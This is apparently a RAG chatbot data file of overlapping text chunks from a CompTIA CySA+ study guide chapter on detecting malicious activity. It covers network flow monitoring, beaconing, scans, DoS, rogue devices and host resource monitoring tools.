rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	■ System and Network Architecture 19. Ben is preparing a system hardening procedure for his organization. Which of the following is not a typical system hardening process or step? A. Updating and patching systems B. Enabling additional services C. Enabling logging D. Configuration disk encryption 20. Gabby is designing a multifactor authentication system for her company. She has decided to use a passphrase, a time-­based code generator, and a PIN to provide additional security. How many distinct factors will she have implemented when she is done? A. One B. Two C. Three D. Four Chapter 3 Malicious Activity THE COMPTIA CYBERSECURITY ANALYST EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 1.0: Security Operations ■■ 1.2 Given a scenario, analyze indicators of potentially malicious activity ■■ 1.3 Given a scenario, use appropriate tools or techniques to determine malicious activity Responding to security incidents and network events is a common task for cybersecurity analysts, and to do so, you need to know how to recognize common indicators of compromise. Network problems such as excessive or suspicious bandwidth consumption, probes and scans, and rogue devices are all likely to be encountered by security professionals and can indicate problems. Host and application issues are also frequently part of response processes, including host performance problems, malware, and more focused attacks. That makes knowing what to look for, how to find it, and what your response options are an important part of cybersecurity operations. In the first section of this chapter, you learn about common network events ranging from bandwidth use and data exfiltration to scans, probes, and denial-­of-­service attacks, as well as some of the tools and techniques that are frequently used to detect them and to perform that analysis. In the sections that follow, you learn about host and application problems, detection and analysis techniques to address them, and examples of handling methods for common issues related to these symptoms. Analyzing Network Events Many incidents start with the discovery of suspicious or unexpected network traffic. These events may take the form of bandwidth consumption, beaconing or other unexpected traffic like scans, or irregular peer-­to-­peer traffic, attack traffic, or rogue devices showing up on the network. As a cybersecurity analyst, you need to be able to gather, correlate, and analyze the data from a multitude of systems and network devices to detect, or better, to prevent these incidents from becoming serious issues. Many organizations differentiate between events and incidents (as we defined in the previous chapter). Events are typically defined as observable events like an email or a file download. Incidents are often classified as a violation of a security policy, unauthorized use or access, denial of service, or other malicious actions that may cause harm. Alerts are sent when events cause notification to occur. Make sure you know how your organization describes events, incidents, and alerts to help prevent confusion. Analyzing Network Events 79 Capturing Network-­Related Events One of the first steps in gaining a high-­level understanding of a network is getting visibility
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	differentiate between events and incidents (as we defined in the previous chapter). Events are typically defined as observable events like an email or a file download. Incidents are often classified as a violation of a security policy, unauthorized use or access, denial of service, or other malicious actions that may cause harm. Alerts are sent when events cause notification to occur. Make sure you know how your organization describes events, incidents, and alerts to help prevent confusion. Analyzing Network Events 79 Capturing Network-­Related Events One of the first steps in gaining a high-­level understanding of a network is getting visibility into how the available bandwidth for the network is being used. This is typically done through one of three common methods: router-­based monitoring, active monitoring, or passive monitoring. Router-­Based Monitoring Router-­based monitoring relies on routers or switches with routing capabilities to provide information about the flow of traffic on the network and the status of the network device itself. Since routers are normally placed at network borders or other internal boundaries, router-­based monitoring can provide a useful view of traffic at those points. Most router-­based monitoring relies on capturing data about the traffic that is passing through the device. This information about traffic flow is often referred to as network flows. A number of technologies exist to capture flows and other router information, including NetFlow, or similar technologies like sFlow and J-­Flow that are standards for monitoring traffic flows. They record information about traffic at network device interfaces and then send that information to flow collectors. Flows are often sampled due to the sheer quantity of data, meaning that one in a thousand or one in a hundred packets are sampled rather than every packet. In addition to flow-­based reporting, the Simple Network Management Protocol (SNMP) is commonly used to collect information from routers and other network devices and provides more information about the devices themselves instead of the network traffic flow information provided by flow-­capture protocols. Exam Note The CS0-­0 03 exam objectives ask about bandwidth consumption, beaconing, irregular peer-­to-­peer communication, rogue devices, scans and sweeps, unusual traffic spikes, and activity on unexpected ports. Each of these can be detected by capturing and analyzing network events, and that’s why we start with this section—­first, you need to know how to get the data and then you can analyze it. In Figure 3.1, a simple example of a typical network shows how the central placement of routers can provide visibility into the overall traffic flow of a network. Traffic sent from the distribution switches to the other division’s network, or to the Internet, will be sent through the division routers and possibly through the border router, allowing network flow information to be captured on a central flow collection system. 80 Chapter 3 FIGURE 3.1 flow collectors. ■ Malicious Activity Routers provide a central view of network traffic flow by sending data to Internet Firewall Intrusion Prevention System (IPS) Border Router Division A Router Division B Router Flow Collector Distribution Switches
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	shows how the central placement of routers can provide visibility into the overall traffic flow of a network. Traffic sent from the distribution switches to the other division’s network, or to the Internet, will be sent through the division routers and possibly through the border router, allowing network flow information to be captured on a central flow collection system. 80 Chapter 3 FIGURE 3.1 flow collectors. ■ Malicious Activity Routers provide a central view of network traffic flow by sending data to Internet Firewall Intrusion Prevention System (IPS) Border Router Division A Router Division B Router Flow Collector Distribution Switches Flow information can look a lot like information from a typical phone bill—­you can see who you called, what number they were at, and how long you talked. With flows, you can see the source, its IP address, the destination, its IP address, how many packets were sent, how much data was sent, and the port and protocol that was used, allowing a good guess about what application was in use. Figure 3.2 shows an example of PRTG’s NetFlow tool, with the data listed in a way that allows it to be sorted and searched. This information can be very useful for both day-­to-­day monitoring and for investigations. In addition, feeding flow data to a security monitoring tool that uses behavior-­based detection capabilities can identify issues like unexpected communications to remote command-and-control (C&C) systems. In Figure 3.2, you can see that local hosts are browsing remote sites—­192.168.1.14 visits 157.240.2.35—­a Facebook content delivery network host. If you saw traffic that was not expected when you reviewed traffic or if you were investigating suspicious traffic, flows can provide a useful way to quickly review what a given host is doing. Network flow data can be used both proactively, to monitor overall network Analyzing Network Events 81 health and traffic levels, and reactively, to monitor for unexpected traffic or for sudden changes in network bandwidth usage. This data is often combined with other network and system log and event data using a security information and event management (SIEM) device or log analysis tool to provide deeper analysis and response capabilities. FIGURE 3.2 NetFlow data example Active Monitoring Active monitoring techniques reach out to remote systems and devices to gather data. Unlike flows and SNMP monitoring, where data is gathered by sending information to collectors, active monitors are typically the data gathering location (although they may then forward that information to a collector). Active monitoring typically gathers data about availability, routes, packet delay or loss, and bandwidth. Active and passive scanning and tools used for penetration testing are discussed in Chapter 5, “Reconnaissance and Intelligence Gathering.” Here are two examples of active monitoring: ■■ ■■ Pings: Network data can also be acquired actively by using Internet Control Message Protocol (ICMP) to ping remote systems. This provides only basic up/down information, but for basic use, ICMP offers a simple solution. iPerf: A tool that measures the maximum bandwidth that an IP network can handle. Public
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	they may then forward that information to a collector). Active monitoring typically gathers data about availability, routes, packet delay or loss, and bandwidth. Active and passive scanning and tools used for penetration testing are discussed in Chapter 5, “Reconnaissance and Intelligence Gathering.” Here are two examples of active monitoring: ■■ ■■ Pings: Network data can also be acquired actively by using Internet Control Message Protocol (ICMP) to ping remote systems. This provides only basic up/down information, but for basic use, ICMP offers a simple solution. iPerf: A tool that measures the maximum bandwidth that an IP network can handle. Public iPerf servers allow remote testing of link bandwidth in addition to internal bandwidth testing. iPerf testing data can help establish a baseline for performance to help identify when a network will reach its useful limits. 82 Chapter 3 ■ Malicious Activity Both active and router-­based monitoring add traffic to the network, which means that the network monitoring systems may be competing with the traffic they are monitoring. When significant network bandwidth utilization issues appear, this type of network monitoring data may be lost or delayed as higher-­priority traffic is likely to be prioritized over monitoring data. Although it is possible to implement your own ping script for monitoring, tools like Nagios have available ping plug-­ins that can use both ICMP and TCP pings with a variety of additional capabilities. Using a full-­featured monitoring tool can allow active ping monitoring to be combined with other data easily, providing far more useful analysis capabilities than a ping script. Passive Monitoring Passive monitoring relies on capturing information about the network as traffic passes a location on a network link. In Figure 3.3, a network monitor uses a network tap to send a copy of all the traffic sent between endpoints A and B. This allows the monitoring system to capture the traffic that is sent, providing a detailed view of the traffic’s rate, protocol, and content, as well as details of the performance of sending and receiving packets. FIGURE 3.3 Passive monitoring between two systems Passive Monitoring Capture System Network Tap Endpoint A Endpoint B Unlike active and router-­based monitoring, passive monitoring does not add additional traffic to the network. It also performs after-­the-­fact analysis, since packets must be captured and analyzed, rather than being recorded in real time as they are sent. This means that the trade-­offs between each monitoring method should be considered when choosing a technique. Detecting Common Network Issues Once you have visibility into your network’s bandwidth and device status, you can use that knowledge to track common network problems. These common problems include Analyzing Network Events 83 bandwidth consumption, link and connection failures, beaconing, and unexpected traffic. Although each of these problems is common, the causes of each type of issue can be quite varied! We will cover unexpected traffic shortly, so keep it in mind as you read about bandwidth consumption and beaconing, and how they are related to it. Bandwidth Consumption Bandwidth consumption can cause service
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	be considered when choosing a technique. Detecting Common Network Issues Once you have visibility into your network’s bandwidth and device status, you can use that knowledge to track common network problems. These common problems include Analyzing Network Events 83 bandwidth consumption, link and connection failures, beaconing, and unexpected traffic. Although each of these problems is common, the causes of each type of issue can be quite varied! We will cover unexpected traffic shortly, so keep it in mind as you read about bandwidth consumption and beaconing, and how they are related to it. Bandwidth Consumption Bandwidth consumption can cause service outages and disruptions of business functions, making it a serious concern for both security analysts and network managers. In a well-­ designed network, the network will be configured to use logging and monitoring methods that fit its design, security, and monitoring requirements, and that data will be sent to a central system that can provide bandwidth usage alarms. Techniques we have already discussed in this chapter can provide the information needed to detect bandwidth consumption issues: ■■ ■■ ■■ ■■ Tools that use flow data can show trend and status information indicating that network bandwidth utilization has peaked. Monitoring tools can be used to check for high usage levels and can send alarms based on thresholds. Real-­time or near-­real-­time graphs can be used to monitor bandwidth as usage occurs. SNMP data can be used to monitor for high load and other signs of bandwidth utilization at the router or network device level. The Importance of Detecting Data Exfiltration In 2015, Penn State University disclosed a breach of systems in their College of Engineering. The breach was reported to potentially include research that was being conducted for the U.S. Department of Defense—­a critical concern for both the U.S. military and the university. When attackers specifically target an organization, they’re often looking for data. That means that once they find a way in and get to the data that they’re interested in, they’ll need to get the data out. Data exfiltration, or the process of attackers getting data out of their target systems and back to them, is a major worry for organizations that rely on the security of their data. Monitoring for data exfiltration can be incredibly challenging. At a university like Penn State, massive amounts of data of all types move between systems on a daily basis, and 84 Chapter 3 ■ Malicious Activity (continued) the prevalence of encrypted communications can make it hard to determine whether the traffic sent to an external site is legitimate traffic or your sensitive data heading out the door. Network monitoring can help to prevent exfiltration if a network is well controlled and well understood. Servers shouldn’t reach out to external systems, and large data transfers to outside systems from sensitive file stores shouldn’t be expected. That means that a combination of anomaly detection and behavior analysis as well as technologies like data loss prevention systems or software can help. Unfortunately, determined attackers are
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	3 ■ Malicious Activity (continued) the prevalence of encrypted communications can make it hard to determine whether the traffic sent to an external site is legitimate traffic or your sensitive data heading out the door. Network monitoring can help to prevent exfiltration if a network is well controlled and well understood. Servers shouldn’t reach out to external systems, and large data transfers to outside systems from sensitive file stores shouldn’t be expected. That means that a combination of anomaly detection and behavior analysis as well as technologies like data loss prevention systems or software can help. Unfortunately, determined attackers are likely to figure out a way to steal data, and proving that data didn’t leave can be nearly impossible. That means that protecting data from being accessed is a much better solution than trying to stop malicious actors as they take the data out of your network. Beaconing Beaconing activity (sometimes a heartbeat) is activity sent to a C&C system as part of a botnet or malware remote control system and is typically sent as either HTTP or HTTPS traffic. Beaconing can request commands, provide status, download additional malware, or perform other actions. Since beaconing is often encrypted and blends in with other web traffic, it can be difficult to identify, but detecting beaconing behavior is a critical part of detecting malware infections. Detection of beaconing behavior is often handled by using an IDS or IPS with detection rules that identify known botnet controllers or botnet-­specific behavior. In addition, using flow analysis or other traffic-­monitoring tools to ensure that systems are not sending unexpected traffic that could be beaconing is also possible. This means that inspecting outbound traffic to ensure that infected systems are not resident in your network is as important as controls that handle inbound traffic. Figure 3.4 shows simulated beaconing behavior, with a host reaching out to a remote site via HTTP every 10 seconds. This type of repeated behavior can be difficult to find when it is slow, but automated analysis can help to identify it. Using a tool like Wireshark, which we cover later in this chapter, to directly capture the traffic, as shown in the figure, can be useful for detailed analysis, but flows and IDSs and IPSs are more useful for a broader view of network traffic. If you want to test your organization’s defenses against beaconing, you can simulate a beacon with the techniques discussed at www .activecountermeasures.com/simulating-­a-­beacon. Analyzing Network Events FIGURE 3.4 85 Beaconing in Wireshark Unexpected Traffic Spikes Unexpected traffic on a network can take many forms: scans, sweeps, and probes; irregular peer-­to-­peer traffic between systems that aren’t expected to communicate directly; spikes in network traffic; activity on unexpected ports; or more direct attack traffic. Unexpected traffic can be detected by behavior-­based detection capabilities built into IDSs and IPSs, by traffic-­monitoring systems, or manually by observing traffic between systems. Understanding what traffic is expected and what traffic is unexpected relies on three major techniques: ■■ ■■ ■■ Baselines, or anomaly-­based
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the techniques discussed at www .activecountermeasures.com/simulating-­a-­beacon. Analyzing Network Events FIGURE 3.4 85 Beaconing in Wireshark Unexpected Traffic Spikes Unexpected traffic on a network can take many forms: scans, sweeps, and probes; irregular peer-­to-­peer traffic between systems that aren’t expected to communicate directly; spikes in network traffic; activity on unexpected ports; or more direct attack traffic. Unexpected traffic can be detected by behavior-­based detection capabilities built into IDSs and IPSs, by traffic-­monitoring systems, or manually by observing traffic between systems. Understanding what traffic is expected and what traffic is unexpected relies on three major techniques: ■■ ■■ ■■ Baselines, or anomaly-­based detection, which require knowledge of what normal traffic is. Baselines are typically gathered during normal network operations. Once baseline data is gathered, monitoring systems can be set to alarm when the baselines are exceeded by a given threshold or when network behavior deviates from the baseline behaviors that were documented. Heuristics, or behavior-­based detection, using network security devices and defined rules for scans, sweeps, attack traffic, and other network issues. Protocol analysis, which uses a protocol analyzer to capture packets and check for problems. Protocol analyzers can help find unexpected traffic, like VPN traffic in a network where no VPN traffic is expected, or IPv6 tunnels running from a production IPv4 network. They can also help identify when common protocols are being sent over an uncommon port, possibly indicating an attacker setting up an alternate service port. Not all unexpected traffic is malicious, but it is important to ensure that you have appropriate systems and methods in place to detect anomalies and unexpected behaviors and that you can identify when unexpected traffic is occurring so that you can respond appropriately. 86 Chapter 3 ■ Malicious Activity Exam Note At this point in the chapter, you’ve read about a number of potential indicators of compromise (IOCs). Objective 1.4 covered in Chapter 4, “Threat Intelligence,” discusses IOCs as a concept in more depth. Make sure you consider how you could identify these behaviors or issues and how you might be able to tell them apart from everyday, non-­compromise-­ related issues. After all, not every full disk or sudden increase in network usage is due to an attack! Detecting Scans and Sweeps Scans, sweeps, and probes are typically not significant threats to infrastructure by themselves, but they are often a precursor to more focused attacks. Detecting scans and probes is often quite simple: network scans are often easily detectable due to the behaviors they include such as sequential testing of service ports, connecting to many IP addresses in a network, and repeated requests to services that may not be active. More stealthy scans and probes can be harder to detect among the general noise of a network, and detecting stealthy scans from multiple remote systems on a system connected to the Internet can be quite challenging. Exam Note The CySA+ exam outline mentions activity on unexpected ports. That’s often one of two things: scans or sweeps that attempt to connect to ports and
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	network scans are often easily detectable due to the behaviors they include such as sequential testing of service ports, connecting to many IP addresses in a network, and repeated requests to services that may not be active. More stealthy scans and probes can be harder to detect among the general noise of a network, and detecting stealthy scans from multiple remote systems on a system connected to the Internet can be quite challenging. Exam Note The CySA+ exam outline mentions activity on unexpected ports. That’s often one of two things: scans or sweeps that attempt to connect to ports and services, or traffic to and from unexpected or new services set up by attackers. As you think about activity on unexpected ports keep in mind that it could be either of these scenarios and look for additional contextual information that can tell you what may be going on. Fortunately, most IDSs and IPSs, as well as other network security devices like firewalls and network security appliances, have built-­in scan detection capabilities. Enabling these can result in a lot of noise, and in many cases there is little you can do about a scan. Many organizations choose to feed their scan detection data to a security information management tool to combine with data from attacks and other events, rather than responding to the scans and probes directly. Analyzing Network Events 87 To test your ability to detect scans, sweeps, and probes, use a scanning tool like nmap and verify that you can detect your own scans. Increase the difficulty by using more advanced features like stealth scans (using the nmap -­sS flag) and nmap’s timing flag, where -­T0 is the slowest scan and -­T5 is a full-­speed aggressive scan. Detecting Denial-­of-­Service and Distributed Denial-­of-­Service Attacks Denial-­of-­service (DoS) attacks can take many forms, but the goal remains the same: preventing access to a system or service. They can be conducted from a single system, or from many systems as part of a distributed denial-­of-­service (DDoS) attack. Detecting and preventing DoS attacks is an increasingly important part of a cybersecurity analyst’s skillset. DoS Attacks DoS attacks typically include one or more of the following patterns of attack: ■■ ■■ ■■ Attempts to overwhelm a network or service through the sheer volume of requests or traffic Attacks on a specific service or system vulnerability to cause the system or service to fail Attacks on an intermediary system or network to prevent traffic from making it between two locations Each of these types of attacks requires slightly different methods of detection. This means that your network, system, and service monitoring capabilities need to be set up to monitor for multiple types of attacks depending on which might target your infrastructure. A DoS attack from a single system or network can typically be stopped by blocking that system or network using a firewall or other network security device. IPSs can also block known attack traffic, preventing a DoS attack from occurring. Single-­system DoS attacks are not
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	an intermediary system or network to prevent traffic from making it between two locations Each of these types of attacks requires slightly different methods of detection. This means that your network, system, and service monitoring capabilities need to be set up to monitor for multiple types of attacks depending on which might target your infrastructure. A DoS attack from a single system or network can typically be stopped by blocking that system or network using a firewall or other network security device. IPSs can also block known attack traffic, preventing a DoS attack from occurring. Single-­system DoS attacks are not as likely as DDoS attacks unless the target suffers from a specific service or application vulnerability, or the target can be easily overwhelmed by a single remote system due to limited bandwidth or other resources. Distributed Denial-­of-­Service Attacks Distributed denial-­of-­service (DDoS) attacks come from many systems or networks at the same time. They can be harder to detect due to the traffic coming from many places, and that also makes them much harder to stop. Many DDoS attacks are composed of compromised systems in botnets, allowing attackers to send traffic from hundreds or thousands of systems. Denial of service and “load testing” services have made denial-­of-­service attacks a commodity, and thus far more accessible to individuals and groups who might otherwise have the resources needed to conduct them. Understanding why your organization might be targeted, and by whom, is an important part of planning for and responding to DoS and DDoS attacks. 88 Chapter 3 ■ Malicious Activity Detecting DoS and DDoS Attacks Since there are many flavors of DoS and DDoS attacks, building an effective DoS and DDoS detection capability usually involves multiple types of tools and monitoring systems. These often include the following: ■■ Performance monitoring using service performance monitoring tools ■■ Connection monitoring using local system or application logs ■■ Network bandwidth or system bandwidth monitoring ■■ Dedicated tools like IDSs or IPSs with DoS and DDoS detection rules enabled During incident response, the same command-­line tools that you can use to analyze network traffic (like netstat) can help with troubleshooting on local servers, but a view from the network or service perspective will typically provide a broader view of the issue. Detecting Other Network Attacks Other network-­based attacks can be detected using the same techniques outlined earlier: ■■ Using an IDS or IPS ■■ Monitoring flows, SNMP, and other network information for suspect behaviors ■■ ■■ ■■ Feeding logs from firewalls, routers, switches, and other network devices to a central log analysis and monitoring system Using a SIEM device to review and automatically alarm them about problem traffic Deploying at the host level tools like endpoint detection and response (EDR) that monitor network behavior at the endpoint level A subscription to a frequently updated and well-­managed feed of IDS/IPS rules and subscribing to threat feeds from organizations or vendors that monitor for trending attacks can help make sure that you stay ahead of the attacks you
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	SNMP, and other network information for suspect behaviors ■■ ■■ ■■ Feeding logs from firewalls, routers, switches, and other network devices to a central log analysis and monitoring system Using a SIEM device to review and automatically alarm them about problem traffic Deploying at the host level tools like endpoint detection and response (EDR) that monitor network behavior at the endpoint level A subscription to a frequently updated and well-­managed feed of IDS/IPS rules and subscribing to threat feeds from organizations or vendors that monitor for trending attacks can help make sure that you stay ahead of the attacks you may find aimed at your network. Detecting and Finding Rogue Devices Rogue devices are devices that are connected to a network that should not be, either by policy or because they have been added by an attacker. Finding rogue devices can be challenging—­many networks have hundreds or thousands of devices, and device management may not be consistent across the network. There are a number of common methods for identifying rogue devices: Valid MAC Address Checking Uses hardware (MAC) address information provided to network devices to validate the hardware address presented by the device to a list of known devices. Analyzing Network Events 89 MAC Address Vendor Information Checking Vendors of network equipment use a vendor prefix for their devices. This means that many devices can be identified based on their manufacturer. Network Scanning Performed using a tool like nmap to identify new devices. Site Surveys Involve physically reviewing the devices at a site either by manual verification or by checking wireless networks on-­site. Traffic Analysis Used to identify irregular or unexpected behavior. You can look up hardware vendors from a MAC address at sites like www .macvendors.com or www.macvendorlookup.com. Remember that it is possible to change MAC addresses, so the address presented by a device isn’t guaranteed to be correct. MAC randomization has also been introduced as a security feature in modern operating systems, including iOS and Android. That means it can be difficult to determine if a device is a legitimate device simply by checking its MAC address against a list of known addresses. Wired and wireless networks face slightly different threats from rogue devices, and you need to be aware of those differences when responding to potential incidents. Wired Rogues Most wired rogues rely on open or unauthenticated networks to connect. Open networks without access controls like port security, which checks for trusted MAC addresses, or network access control (NAC) technology are easy targets for wired rogue devices. A wired rogue device typically means that one of two likely scenarios has occurred: ■■ ■■ An employee or other trusted member of the organization has connected a device, either without permission or without following the process required to connect a device. An attacker has connected a device to the network. The first scenario may be a simple mistake, but the second implies that an attacker has had physical access to your network! In either case, rogue devices connected to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	security, which checks for trusted MAC addresses, or network access control (NAC) technology are easy targets for wired rogue devices. A wired rogue device typically means that one of two likely scenarios has occurred: ■■ ■■ An employee or other trusted member of the organization has connected a device, either without permission or without following the process required to connect a device. An attacker has connected a device to the network. The first scenario may be a simple mistake, but the second implies that an attacker has had physical access to your network! In either case, rogue devices connected to a wired network should be responded to quickly so that they can be removed or otherwise handled appropriately. Preventing wired rogue devices can be accomplished by either restricting which devices can connect (via port security or a similar MAC address limiting technology) or via NAC and requiring authentication to the network. Unfortunately, MAC address filtering won’t stop determined attackers—­they only need to replace a legitimate device with their own with the MAC address set to match the trusted device—­but it will stop casual attempts to connect. 90 Chapter 3 ■ Malicious Activity Wireless Rogues Wireless rogues can create additional challenges because they can’t always easily be tracked to a specific physical location. That means that tracking down a rogue may involve using signal strength measures and mapping the area where the rogue is to attempt to locate it. Fortunately, if the wireless rogue is plugged into your network, using a port scan with operating system identification turned on can often help locate the device. In Figure 3.5, a common consumer router was scanned after it was connected to a network. In this example, nmap cannot immediately identify the device, but it is obvious that it is not a typical desktop system since it shows the router as potentially being a VoIP phone, firewall, or other embedded device. FIGURE 3.5 nmap scan of a potential rogue system Wireless rogues can also create issues by spoofing legitimate networks, persuading legitimate users that they’re part of your organization’s network. This normally involves overpowering legitimate access points, so using enterprise wireless controllers that can detect interference and report on it (or even automatically overpower it!) can help prevent the problem. Exam Note Remember that the CySA+ exam outline’s focus for this section is on understanding and analyzing indicators of potentially malicious activity. Thus, as you review network-­related indicators you should focus on what malicious activity would look like, how you would detect it, and how you might know if it was an attack or simply unexpected or new traffic or behavior on your network. Investigating Host-­Related Issues 91 Investigating Host-­Related Issues Security issues for servers and workstations can be challenging to identify. Modern malware is extremely good at remaining hidden. Fortunately, system monitoring tools can help identify unexpected behaviors by checking for host-­related issues. That means system monitoring is useful for both security and day-­to-­day system health purposes. System Resources The most basic monitoring
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	you review network-­related indicators you should focus on what malicious activity would look like, how you would detect it, and how you might know if it was an attack or simply unexpected or new traffic or behavior on your network. Investigating Host-­Related Issues 91 Investigating Host-­Related Issues Security issues for servers and workstations can be challenging to identify. Modern malware is extremely good at remaining hidden. Fortunately, system monitoring tools can help identify unexpected behaviors by checking for host-­related issues. That means system monitoring is useful for both security and day-­to-­day system health purposes. System Resources The most basic monitoring for most servers and workstations is resource monitoring. Utilization information for system resources like CPU, memory, disk, and network can provide valuable details about the state of the system, its workloads, and whether a problem exists. Processor Consumption and Monitoring Understanding what processes are consuming CPU time, how much CPU utilization is occurring, and when the processes are running can be useful for incident detection and response. Sudden spikes, or increased processor consumption in CPU usage on a system with otherwise consistent usage levels, may indicate new software or a process that was not previously active. Consistently high levels of CPU usage can also point to a DoS condition. Used alone, CPU load information typically will not tell the whole story, but it should be part of your monitoring efforts. Memory Consumption and Monitoring Most operating system level memory monitoring is focused on memory utilization or memory consumption, rather than what is being stored in memory. That means your visibility into memory usage is likely to focus on consumption and process identification. Most protective measures for memory-­based attacks occur as part of an operating system’s built-­in memory management or when code is compiled. Most organizations set memory monitoring levels for alarms and notification based on typical system memory usage and an “emergency” level when a system or application is approaching an out-­of-­memory condition. This can be identified by tracking memory usage during normal and peak usage and then setting monitoring thresholds, or levels where alarms or alerts will occur, based on that data. If you’re troubleshooting memory issues in Windows, you may encounter a result code titled Buffer Overflow—­this doesn’t mean you’re under attack. Instead, it indicates that an application requested data but did not have sufficient memory space allocated. The Windows Buffer Overflow result tag simply indicates insufficient memory allocation. 92 Chapter 3 ■ Malicious Activity Drive Capacity Consumption and Monitoring Drive capacity monitoring typically focuses on specific capacity levels and is intended to prevent the drive or volume from filling up, causing an outage. Tools to monitor drive capacity consumption are available for all major operating systems, as well as centralized monitoring and management systems like System Center Operations Manager (SCOM) for Windows or Nagios for Linux. Microsoft Intune can also provide information about disk usage. Disk monitoring in real time can help prevent outages and issues more easily than a daily report since disks can fill up
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	allocation. 92 Chapter 3 ■ Malicious Activity Drive Capacity Consumption and Monitoring Drive capacity monitoring typically focuses on specific capacity levels and is intended to prevent the drive or volume from filling up, causing an outage. Tools to monitor drive capacity consumption are available for all major operating systems, as well as centralized monitoring and management systems like System Center Operations Manager (SCOM) for Windows or Nagios for Linux. Microsoft Intune can also provide information about disk usage. Disk monitoring in real time can help prevent outages and issues more easily than a daily report since disks can fill up quickly. Filesystem Changes and Anomalies Monitoring in real time for filesystem changes can help to catch attacks as they are occurring. Tools like the open source Wazuh security platform provide file integrity monitoring that keeps an eye on files, permissions, ownership, and file attributes and then sends alerts based on that monitoring. If you want to check out Wazuh, you can find it at http://wazuh.com. Open source tools like Tripwire (Tripwire is available as both a commercial and an open source tool) and Advanced Intrusion Detection Environment (AIDE) as well as a wide variety of commercial products offer this type of functionality. The trade-­off for most products is noise level due to filesystem changes that are part of normal operations versus catching unexpected changes. Manual verification of files using known good checksums is also part of many incident responders’ practices. Sites like the National Software Reference Library (NSRL) collect digital signatures to allow verification against known checksums: www.nist.gov/itl/ ssd/software-­quality-­group/national-­software-­reference-­library-­nsrl. System Resource Monitoring Tools Windows provides built-­in resource and performance monitoring tools. Resource Monitor, or resmon, is the Windows resource monitor and provides easy visibility into the CPU, memory, disk, and network utilization for a system. In addition to utilization, its network monitoring capability shows processes with network activity, which TCP connections are open, and what services are associated with open ports on the system. Figure 3.6 shows the Resource Monitor overview screen for a sample Windows system. Performance Monitor, or perfmon, provides much more detailed data, with counters ranging from energy usage to disk and network activity. It also supports collection from remote systems, allowing a broader view of system activity. For detailed data collection, perfmon is a better solution, whereas resmon is useful for checking the basic usage measures for a machine quickly. Figure 3.7 shows perfmon configured with a disk and processor monitor. This data can be combined into user-­or system-­defined reports. Investigating Host-­Related Issues FIGURE 3.6 93 The Windows Resource Monitor view of system resources The Sysinternals suite for Windows provides extensive monitoring capabilities beyond the built-­in set of tools. You can download the Sysinternals tools at http:// technet.microsoft.com/en-­us/sysinternals, or you can run them live at the Windows command prompt or from File Explorer by entering https://live.sysinternals .com/toolname, replacing toolname with the name of the tool you want to use. To start resmon or perfmon (as well as other Windows Control Panel plug-­ins), simply type their names
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	a disk and processor monitor. This data can be combined into user-­or system-­defined reports. Investigating Host-­Related Issues FIGURE 3.6 93 The Windows Resource Monitor view of system resources The Sysinternals suite for Windows provides extensive monitoring capabilities beyond the built-­in set of tools. You can download the Sysinternals tools at http:// technet.microsoft.com/en-­us/sysinternals, or you can run them live at the Windows command prompt or from File Explorer by entering https://live.sysinternals .com/toolname, replacing toolname with the name of the tool you want to use. To start resmon or perfmon (as well as other Windows Control Panel plug-­ins), simply type their names into the Windows search or Run menu. 94 Chapter 3 FIGURE 3.7 ■ Malicious Activity The Windows Performance Monitor view of system usage Linux has a number of built-­in tools that can be used to check CPU, disk, and memory usage. They include the following: ■■ ■■ ■■ ■■ ps provides information about CPU and memory utilization, the time that a process was started, and how long it has run, as well as the command that started each process. top provides CPU utilization under CPU stats and also shows memory usage as well as other details about running processes. top also provides interaction via hotkeys, including allowing quick identification of top consumers by entering A. df displays a report of the system’s disk usage, with various flags providing additional detail or formatting. w indicates which accounts are logged in. Although this isn’t directly resource-related, it can be useful when determining who may be running a process. Many other Linux tools are available, including graphical tools; however, almost all Linux distributions will include ps, top, and df, making them a good starting point when checking the state of a system. Investigating Host-­Related Issues 95 In Linux, use the -­h flag for df to show filesystem usage in a human-­ readable format. Malware, Malicious Processes, and Unauthorized Software Unauthorized software and malware is a major cause of system issues. Software issues can range from application and driver incompatibilities to unauthorized software that sends network traffic, resulting in issues for other systems on the network. Exam Note The CySA+ exam objectives mention malicious processes and unauthorized software, but not malware in this section. When you prepare for the exam, you should remember the CySA+ terms, but bear in mind the fact that malware, viruses, and similar terms can all be used to describe the same types of things. Detecting malware, malicious processes, and unauthorized software often relies on a handful of major methods: ■■ ■■ ■■ ■■ ■■ Central management tools like Microsoft Endpoint Manager, which can manage software installation and report on installed software. It is important to note that unlike tools like resmon and perfmon, Endpoint Manager doesn’t monitor in real time. Antivirus and antimalware tools, which are designed to detect potentially harmful software and files. Endpoint detection and response (EDR), which we will discuss in more depth later in this chapter, can help detect malicious files and behavior and allow
